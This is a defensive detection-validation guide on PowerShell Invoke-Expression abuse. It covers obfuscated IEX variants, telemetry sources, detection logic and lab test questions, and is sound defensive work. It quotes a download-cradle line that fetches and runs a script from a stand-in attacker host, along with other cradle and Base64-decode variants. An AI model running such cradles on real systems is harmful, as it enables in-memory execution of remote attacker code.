# Invoke-Expression (IEX) Abuse Validation

**Mission Question:** Can we detect Invoke-Expression abuse reliably, or are we matching a string and calling it coverage?

## Table of Contents

1. [How Does the Technique Work?](#1-how-does-the-technique-work)  
2. [Why Do Attackers Use It?](#2-why-do-attackers-use-it)  
3. [What Telemetry Is Generated?](#3-what-telemetry-is-generated)  
4. [What Assumptions Do Defenders Make?](#4-what-assumptions-do-defenders-make)  
5. [ATT\&CK Mapping](#5-attck-mapping)  
6. [Telemetry Inventory](#6-telemetry-inventory)  
7. [Detection Opportunities](#7-detection-opportunities)  
8. [Validation Questions](#8-validation-questions)

## 1\. How Does the Technique Work?

### Core Execution Flow

`Invoke-Expression` (alias: `IEX`) is a built-in PowerShell cmdlet that takes a string and executes it as PowerShell code. It is functionally equivalent to `eval()` in other languages — anything that resolves to a string can be executed.

**Basic usage example:**

<img width="777" height="473" alt="Image" src="https://github.com/user-attachments/assets/817abade-3c80-4fc1-a4be-8e0f1f85c5a1" />

**Full execution flow (download cradle pattern):**

Attacker hosts payload on remote server  
		
		⬇️  
Victim machine: Net.WebClient.DownloadString() retrieves payload string  
		
		⬇️  
String passed directly to Invoke-Expression / IEX  
		
		⬇️  
PowerShell runtime executes string as code in current process context  
		
		⬇️  
No script file written to disk  
		
		⬇️  
Payload executes in memory — may spawn children, beacon to C2, etc.

### Common Obfuscated Variants

| Variant | Example |
| :---- | :---- |
| Direct alias | `IEX "..."` |
| Full cmdlet | `Invoke-Expression "..."` |
| Pipe form | `"..." | IEX` |
| Variable intermediate | `$x = "..."; IEX $x` |
| String concatenation | `IEX ("Write" + "-Host 'test'")` |
| Decoded from Base64 | `IEX ([System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($enc)))` |
| ScriptBlock form | `&([scriptblock]::Create("Write-Host 'test'"))` |
| Nested with DownloadString | `IEX (iwr 'http://...').Content` |

⚠️ **Key point:** None of these forms look the same to a string-matching parser. A rule matching only `IEX` misses most of the above variants.

### Parent-Child Process Relationships

IEX itself does not spawn a child process — it executes within the current PowerShell session. This is what makes it harder to detect than `-EncodedCommand`. The process creation telemetry shows `powershell.exe` launching; IEX activity appears only in script block logs or behavioral telemetry.

Unless the executed payload spawns a child process, process-based detection alone is insufficient.

## 2\. Why Do Attackers Use It?

### In-Memory Execution

The most powerful property of IEX is that it executes code that never touches disk as a file. A payload retrieved via `DownloadString` exists only as a string in memory — no hash, no file path, no AV scan opportunity on write.

### Flexible Payload Delivery

IEX is source-agnostic. The string being executed can come from:

- A hardcoded string in the script  
- A variable built through concatenation  
- A Base64-decoded blob  
- A remotely retrieved file  
- A registry value  
- A network socket read

This flexibility makes it composable with almost any other evasion technique.

### Obfuscation Support

Because IEX simply takes a string, the payload can be obfuscated at the string level before being passed. The obfuscation does not need to survive parsing — it only needs to survive the SIEM. By the time PowerShell actually executes, the content is already in memory.

### Popularity Among Threat Actors

| Threat Actor / Tool | Known IEX Usage |
| :---- | :---- |
| Cobalt Strike | Default PowerShell stager uses IEX \+ download cradle |
| PowerShell Empire | Core execution primitive |
| Emotet | Staged PowerShell payloads |
| APT29 / Cozy Bear | Documented use of download cradles with IEX |
| Living-off-the-land campaigns | IEX paired with LOLBAS for delivery |

## 3\. What Telemetry Is Generated?

### PowerShell Script Block Logging — Event ID 4104 ⭐

This is the primary detection surface for IEX. When enabled, EID 4104 logs every script block before execution — including the content being passed to IEX, regardless of how it was assembled or obfuscated.

**What a 4104 event shows for IEX:**

`EventID: 4104`

`ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload.ps1')`

`Path:`

`MessageNumber: 1`

`MessageTotal: 1`

If the downloaded payload is also executed via PowerShell, a second 4104 event fires for the payload content itself.

⚠️ **Gap:** EID 4104 requires script block logging to be enabled via GPO. It is **off by default**. Many environments have module logging (EID 4103\) enabled without script block logging.

GPO path:

Computer Configuration → Administrative Templates →

Windows Components → Windows PowerShell →

Turn on PowerShell Script Block Logging → Enabled

### Sysmon Event ID 1 — Process Creation

Captures the `powershell.exe` invocation and its command-line arguments. Useful for detecting the parent process and any flags (e.g., `-NonInteractive`, `-WindowStyle Hidden`, `-NoProfile`).

However: if the attacker launches PowerShell without explicit IEX in the command-line argument (e.g., the IEX call is inside a script file or retrieved remotely), EID 1 alone will not reveal the IEX usage.

⚠️ **Gap:** Sysmon requires deployment and a config that includes process creation. Not present in all environments.

### Windows Security Log — Event ID 4688

Process creation event. Same limitation as Sysmon EID 1 — useful for the PowerShell invocation, not for IEX activity within the session.

⚠️ **Gap:** Command-line capture for 4688 requires explicit Group Policy configuration. Disabled by default.

### AMSI — Antimalware Scan Interface

AMSI intercepts PowerShell content before execution and passes it to the registered security product. Critically, AMSI sees the **decoded, deobfuscated content** that IEX is about to execute — not the obfuscated input string.

This makes AMSI a strong detection surface — when it is properly integrated and not bypassed.

⚠️ **Gap:** AMSI integration depends on the security product. AMSI bypass techniques exist and are widely documented (see later).

### Network Telemetry

When IEX is paired with a download cradle, the following network artifacts are generated:

- DNS query for the attacker domain  
- HTTP or HTTPS GET request from `powershell.exe`  
- Proxy logs if egress is routed through a proxy

✅ **Advantage:** Network telemetry is often more consistently collected than endpoint script logging. A DNS query from `powershell.exe` to an unknown external host is a high-signal indicator even without content visibility.

### EDR Behavioral Telemetry

Modern EDRs may detect IEX via:

- PowerShell process behavior monitoring  
- Memory scanning for known payload patterns  
- API call telemetry for network connections originating from `powershell.exe`  
- Script content inspection via AMSI integration

⚠️ **Gap:** EDR visibility does not automatically mean the SIEM receives usable, normalized fields. The pipeline from EDR agent → EDR backend → SIEM connector → normalized index must be validated end to end.

## 4\. What Assumptions Do Defenders Make?

| Assumption | Reality |
| :---- | :---- |
| "We alert on IEX" | A string match on `IEX` misses `Invoke-Expression`, pipe syntax, variable-passed strings, and all concatenated/decoded variants |
| "PowerShell logging is enabled" | Module logging (EID 4103\) and script block logging (EID 4104\) are different settings. EID 4104 is off by default and is the one that matters for IEX |
| "Our EDR sees PowerShell" | The EDR agent may observe the activity; the SIEM may not receive a normalized, searchable field containing the script block content |
| "We blocked \-EncodedCommand, so PowerShell abuse is handled" | IEX does not require Base64 encoding. Blocking `-EncodedCommand` does not close the IEX gap |
| "We have the logs" | Having raw logs, having a searchable index, and having an alerting rule on the right field are three separate operational problems |
| "AMSI covers it" | AMSI can be bypassed (covered later\) and depends on security product integration quality |
| "The analyst would catch unusual PowerShell" | Without a specific alert, PowerShell activity is rarely triaged proactively in high-volume SOC environments |

## 5\. ATT\&CK Mapping

| Field | Value |
| :---- | :---- |
| **Tactic** | Execution, Defense Evasion |
| **Technique** | T1059.001 — Command and Scripting Interpreter: PowerShell |
| **Related** | T1105 — Ingress Tool Transfer (download cradle pattern) |
| **Related** | T1027 — Obfuscated Files or Information (concatenation/decode variants) |
| **Platform** | Windows |
| **Data Sources** | Script: Script Execution, Process: Process Creation, Network Traffic: Network Connection Creation |

## 6\. Telemetry Inventory

| Data Source | Event ID | What It Captures | Default Enabled? | Notes |
| :---- | :---- | :---- | :---- | :---- |
| PowerShell Script Block Logging | EID 4104 | Decoded script block content including IEX argument | **No** | Most important source — requires GPO |
| PowerShell Module Logging | EID 4103 | Pipeline execution output | No | Does NOT capture script block content |
| Sysmon Process Creation | EID 1 | Process launch with command-line args | No | Requires Sysmon deployment |
| Windows Security | EID 4688 | Process creation (limited without config) | Partial | Requires cmd-line GPO setting |
| AMSI | Vendor-dependent | Decoded content before execution | Yes (if product integrated) | Bypassable — see later 5 |
| Network / DNS / Proxy | N/A | Outbound connections from powershell.exe | Varies | High signal when present |
| EDR Behavioral | Vendor-dependent | Process behavior, API calls, memory | Depends on policy | Does not guarantee SIEM field delivery |

## 7\. Detection Opportunities

### High Confidence

PowerShell EID 4104

\+ ScriptBlockText contains: IEX | Invoke-Expression | DownloadString | iwr | Invoke-WebRequest

\+ ScriptBlockText length \> 200 characters

### Medium Confidence

powershell.exe process creation (Sysmon EID 1 or EID 4688\)

\+ CommandLine contains: \-NoProfile \-NonInteractive \-WindowStyle Hidden

\+ ParentImage is: winword.exe, excel.exe, mshta.exe, wscript.exe, cscript.exe, cmd.exe

### Network-Based

Network connection from powershell.exe

\+ Destination is external (non-RFC1918)

\+ Protocol: DNS query to previously unseen domain

\+ OR HTTP GET to .ps1 file path

### Behavioral Baseline Deviation

Host-level frequency of PowerShell network connections per day

\> 2 standard deviations from 30-day rolling baseline

**Reminder:** These are detection logic candidates, not production rules. Each must be lab-validated before deployment.

## 8\. Validation Questions

Answer these before closing:

- [ ] Is **script block logging** (EID 4104\) enabled via GPO? Verify it applies to the correct OUs — not just the policy object existing.  
- [ ] Run a test: execute `IEX "Write-Host 'DetectionHunter'"` in your lab environment. Did EID 4104 fire? What field contained the content?  
- [ ] Run a test with a **concatenated form**: `$a = "Write-H"; $b = "ost 'test'"; IEX ($a + $b)` — does the same 4104 fire? Does the full assembled string appear?  
- [ ] Does your SIEM have a rule targeting the **ScriptBlockText field** specifically? Or does it target command-line arguments only?  
- [ ] If your EDR captures this activity, verify: does that field appear in your SIEM index? Is it normalized? Is it searchable?  
- [ ] Execute a download cradle test to an internal test server: does **network telemetry** from `powershell.exe` appear in your proxy or DNS logs?  
- [ ] Can you distinguish between a rule that **fires** and a rule that is **configured but never fires**? When did your IEX-related alert last trigger?

[image1]: <data:image/png;base64,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